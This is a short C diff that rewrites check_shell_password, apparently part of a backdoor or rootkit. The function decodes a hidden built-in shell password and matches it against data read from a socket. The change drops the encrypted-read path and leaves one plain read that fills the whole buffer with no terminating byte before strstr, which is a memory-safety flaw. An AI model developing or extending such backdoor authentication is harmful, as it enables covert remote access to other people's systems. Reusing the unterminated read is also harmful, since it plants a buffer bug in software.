@@ -717,18 +717,10 @@ int check_shell_password(int sock, int crypt) {
 	char *shell_passwd = strdup(SHELL_PASSWD);
 	x(shell_passwd);
 	memset(buffer, 0x00, sizeof(buffer));
-	if (crypt) {
-		crypt_read(sock,buffer,sizeof(buffer)-1);
-		if (strstr(buffer, shell_passwd)) {
-			cleanup(shell_passwd, strlen(shell_passwd));
-			return 1;
-		}
-	} else {
-		read(sock, buffer, sizeof(buffer));
-		if(strstr(buffer, shell_passwd)) {
-			cleanup(shell_passwd, strlen(shell_passwd));
-			return 1;
-		}
+	read(sock, buffer, sizeof(buffer));
+	if(strstr(buffer, shell_passwd)) {
+		cleanup(shell_passwd, strlen(shell_passwd));
+		return 1;
 	}
 	return -1;
 }
